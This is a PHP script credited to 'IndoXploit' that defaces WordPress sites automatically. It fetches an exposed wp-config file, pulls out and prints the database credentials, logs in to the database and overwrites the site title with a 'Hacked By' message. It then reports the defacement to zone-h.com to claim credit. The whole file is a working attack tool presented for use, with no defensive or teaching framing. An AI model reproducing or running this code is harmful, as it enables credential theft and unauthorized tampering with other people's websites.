<?php
// Tu5b0l3d -IndoXploit-
// Wordpress Auto Deface Title Melalui link Config.

error_reporting(0);
	if($_POST){

		function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

	function anucurl($sites){
		$ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
	}


		$link = $_POST['link'];
		$script = $_POST['script'];
		if($script==""){
			echo "<center><h1>Isi Dulu Hacked By</h1></center>";
		}
		else{

		$file = anucurl($link);

		$host = ambilkata($file,"DB_HOST', '","'");
					$username = ambilkata($file,"DB_USER', '","'");
					$password = ambilkata($file,"DB_PASSWORD', '","'");
					$db = ambilkata($file,"DB_NAME', '","'");
					$dbprefix = ambilkata($file,"table_prefix  = '","'");
					$sue = $db.".".$dbprefix."options";
					


					echo "# Db Host: $host<br>";
					echo "# Db user: $username<br>";
					echo "# Db Password: $password<br>";
					echo "# Db name: $db<br>";
					echo "# Table_Prefix: $dbprefix<br>";		

		mysql_connect($host,$username,$password);
		mysql_select_db($db);

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
         echo "# $target<br>";
        
         mysql_query("UPDATE $sue SET option_value='$script' WHERE option_name='blogname'");

$bs = anucurl($target);

 if(preg_match("#hacked#si",$bs)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "# <a href='$target' target='_blank'>$target</a><br>";
                        echo "-> zone-h: ";
					$ch3 = curl_init ("http://www.zone-h.com/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=ID-IM&domain1=$target&hackmode=1&reason=1&submit=Send");  // here put ur name on zone-h
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok ";
        }else{
                echo " No";
                       
                    }
                }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";

                       
                    }
                }


	}else{
			echo '<html>
	<head>
		<title>Created By IndoXploit Just For Wordpress</title>
	</head>

	<body>
			<center>
				<font face="arial"><h2>INDO<font color="red">}{</font>PLOIT <br><br> Wordpress Auto Deface </h2><hr></font>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="link" placeholder="link config"></td></tr>
							<tr><td><input type="text" name="script" placeholder="Hacked By Tu5b0l3d"> //Must Hacked</td></tr>

							<tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						
			</center>

	</body>
</html>';
		}

?>
